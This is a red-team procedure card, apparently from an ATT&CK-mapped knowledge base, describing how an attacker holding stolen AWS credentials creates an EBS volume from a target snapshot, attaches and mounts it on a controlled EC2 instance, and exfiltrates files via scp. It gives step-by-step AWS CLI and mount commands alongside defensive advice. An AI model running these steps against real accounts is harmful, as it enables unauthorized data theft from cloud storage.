---
id: 8d283cd7-110a-4b90-9cd0-e4b8b98e6f72
name: AWS-EBS-Snapshot-Volume-Creation
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:13.804617+00:00'
updated_at: '2023-04-10T20:20:10.438647+00:00'
tactics:
  - '[[tactics/Collection|TA0009 - Collection]]'
techniques:
  - >-
    [[techniques/Data-from-Cloud-Storage-Objects|T1530 - Data from Cloud Storage
    Objects]]
sub_techniques: []
tags:
  - aws
  - ebs
  - snapshot
  - volume-creation
  - data-exfiltration
  - cloud-exploitation
commands:
  - '[[commands/aws-ec2-create-volume-from-snapshot]]'
  - '[[commands/aws-ec2-attach-volume-to-instance]]'
platforms:
  - AWS
tools:
  - '[[tools/AWS-CLI]]'
validated: true
---

# AWS-EBS-Snapshot-Volume-Creation

## Summary

This procedure outlines how to create a new Elastic Block Store (EBS) volume from an existing snapshot using AWS CLI, attach it to an EC2 instance, and mount it to access potentially sensitive data. It is useful in cloud penetration testing or red team scenarios where an attacker has compromised AWS credentials with sufficient permissions to manipulate EBS resources, enabling data collection from snapshots that may contain filesystem data from compromised instances.

## Description

In AWS environments, EBS snapshots capture the state of volumes at a point in time and can be used to restore data. An attacker with valid AWS credentials (e.g., obtained via credential dumping or misconfiguration) can create a new volume from a target snapshot, attach it to a controlled EC2 instance, and mount the filesystem to exfiltrate data. This technique targets cloud storage for collection and is particularly effective against unencrypted volumes or snapshots shared inadvertently. The process assumes the attacker has identified a snapshot ID through prior reconnaissance (e.g., via AWS API enumeration). Once mounted, filesystems can be browsed for sensitive information like configuration files, logs, or credentials. This procedure focuses on Linux-based EC2 instances for mounting but can be adapted.

## Requirements

1. Valid AWS credentials with EC2 permissions: `ec2:CreateVolume`, `ec2:AttachVolume`, `ec2:DescribeVolumes`, and `ec2:DescribeSnapshots`.
2. AWS CLI installed and configured with the profile containing the credentials.
3. Access to an existing EBS snapshot ID (e.g., obtained via `aws ec2 describe-snapshots`).
4. An EC2 instance under attacker control in the same Availability Zone as the new volume, with SSH access and sufficient privileges to mount devices (e.g., root or sudo).
5. The snapshot must be in a readable state and not encrypted (or attacker has KMS key access).

## Defense

- Implement least-privilege IAM policies to restrict `CreateVolume` and `AttachVolume` actions to authorized roles only.
- Enable EBS encryption by default and use customer-managed KMS keys with strict access controls.
- Monitor CloudTrail logs for unusual EBS API calls, such as volume creations from snapshots not owned by the caller.
- Use AWS Config rules to alert on snapshot sharing or public exposure, and regularly audit snapshot permissions.
- Deploy GuardDuty for detection of anomalous API activity related to EBS manipulation.

## Objectives

1. Create a new EBS volume from a target snapshot to duplicate its contents.
2. Attach the volume to an attacker-controlled EC2 instance for access.
3. Mount the volume and extract sensitive data from the filesystem.

## Instructions

### Step 1: Create Volume from Snapshot

**Context**: Use the AWS CLI to create a new EBS volume based on the specified snapshot. This duplicates the snapshot's data into a usable block device. Replace placeholders with actual values: snapshot ID (e.g., snap-0123456789abcdef0), Availability Zone (e.g., us-east-1a), and profile name.

**Command** ([[commands/aws-ec2-create-volume-from-snapshot]]):
```bash
aws ec2 create-volume --snapshot-id snap-0123456789abcdef0 --availability-zone us-east-1a --profile default
```

> This command provisions a new volume with the same size and type as the snapshot. Note the returned VolumeId (e.g., vol-049df61146c4d7901) for the next step. The volume will be in 'available' state.

### Step 2: Attach Volume to EC2 Instance

**Context**: Attach the newly created volume to an existing EC2 instance controlled by the attacker. This makes the volume available as a block device on the instance. Replace VolumeId, InstanceId (e.g., i-1234567890abcdef0), device name (e.g., /dev/sdf), and profile.

**Command** ([[commands/aws-ec2-attach-volume-to-instance]]):
```bash
aws ec2 attach-volume --volume-id vol-049df61146c4d7901 --instance-id i-1234567890abcdef0 --device /dev/sdf --profile default
```

> The attachment process may take a few seconds. Verify status with `aws ec2 describe-volumes --volume-ids vol-049df61146c4d7901`. Once 'in-use', SSH into the EC2 instance to proceed.

### Step 3: Mount and Access the Volume

**Context**: On the EC2 instance, identify the device (e.g., /dev/xvdf for /dev/sdf), create a mount point, and mount the filesystem. Assume ext4 filesystem; adjust for others like XFS. This step requires instance access and root privileges.

**Instructions**: SSH into the instance and run:
```bash
sudo mkdir /mnt/snapshot
sudo mount /dev/xvdf /mnt/snapshot
ls /mnt/snapshot
```

> If the volume has a filesystem label or UUID, use `blkid /dev/xvdf` to confirm. Success is indicated by accessible files in /mnt/snapshot. Browse for sensitive data (e.g., /etc/, application configs) and exfiltrate via scp or other means. Unmount with `sudo umount /mnt/snapshot` when done.
